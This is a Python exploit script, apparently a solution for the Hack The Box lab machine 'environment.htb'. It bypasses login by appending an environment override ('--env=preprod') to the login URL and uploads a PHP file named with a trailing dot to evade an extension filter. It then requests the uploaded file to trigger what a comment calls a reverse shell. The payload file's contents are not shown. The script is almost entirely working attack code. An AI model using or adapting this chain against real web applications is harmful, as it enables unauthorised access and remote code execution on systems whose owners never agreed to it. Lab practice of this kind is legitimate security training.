import requests
from bs4 import BeautifulSoup

BASE_URL = "http://environment.htb"
ENV = "preprod"  # as seen in the login URL

def get_csrf_token(session: requests.Session, url: str) -> str:
    """
    Fetches the page at `url` and parses out the value of the hidden
    input named '_token'.
    """
    resp = session.get(url)
    resp.raise_for_status()

    # Parse out the CSRF token from the login page’s form
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "_token"})
    if not token_input:
        raise RuntimeError("CSRF token input not found on page")
    return token_input["value"]


def login(session: requests.Session, email: str, password: str):
    login_url = f"{BASE_URL}/login?--env={ENV}"
    # 1) Obtain fresh CSRF token
    token = get_csrf_token(session, login_url)

    # 2) Send login POST
    data = {
        "_token":   token,
        "email":    email,
        "password": password,
        "remember": "False"
    }
    resp = session.post(login_url, data=data)
    resp.raise_for_status()
    print("[+] Logged in successfully.")


def upload_file(session: requests.Session, filepath: str):
    upload_url = f"{BASE_URL}/upload"
    # We need a fresh CSRF token for the upload form, too
    token = get_csrf_token(session, f"{BASE_URL}/management/profile")

    # Prepare multipart‐form data
    files = {
        "_token": (None, token),
        "upload": (filepath, open(filepath, "rb"), "application/octet-stream"),
    }
    resp = session.post(upload_url, files=files, proxies={'http':'http://localhost:8080'})
    resp.raise_for_status()
    print("[+] Upload completed: HTTP", resp.status_code)
    print(resp.text)
    return resp


def main():
    session = requests.Session()

    # Optional: you can set a default User‑Agent if you like
    session.headers.update({
        "User-Agent": "python-requests/2.x"
    })

    # 1. Login
    login(session, email="test@test.com", password="test")

    # 2. Upload
    response = upload_file(session, "malicious-file3.php.")

    # 3. Visit reverse shell
    session.get(response.json()['url'])

if __name__ == "__main__":
    main()
